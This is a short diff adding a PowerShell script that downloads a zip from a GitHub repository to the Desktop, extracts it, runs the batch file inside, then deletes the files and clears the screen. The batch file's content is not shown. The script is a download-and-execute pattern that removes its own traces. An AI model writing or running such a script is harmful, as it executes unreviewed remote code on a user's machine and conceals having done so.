@@ -1,0 +1,19 @@
+# $Owner = "3lv"
+# $Project = "a"
+# $Branch = "master"
+
+$w = Join-Path $HOME "Desktop"
+
+$u = "https://github.com/3lv/a/archive/main.zip"
+$z = "$w\a.zip"
+$d = "$w\a\"
+
+(New-Object System.Net.WebClient).DownloadFile($u, $z)
+
+Expand-Archive -Path $z -DestinationPath $d -Force
+Remove-Item $z -Force
+
+cd $d\..
+.\a\a-main\a.bat
+Remove-Item $d -Recurse -Force
+cls
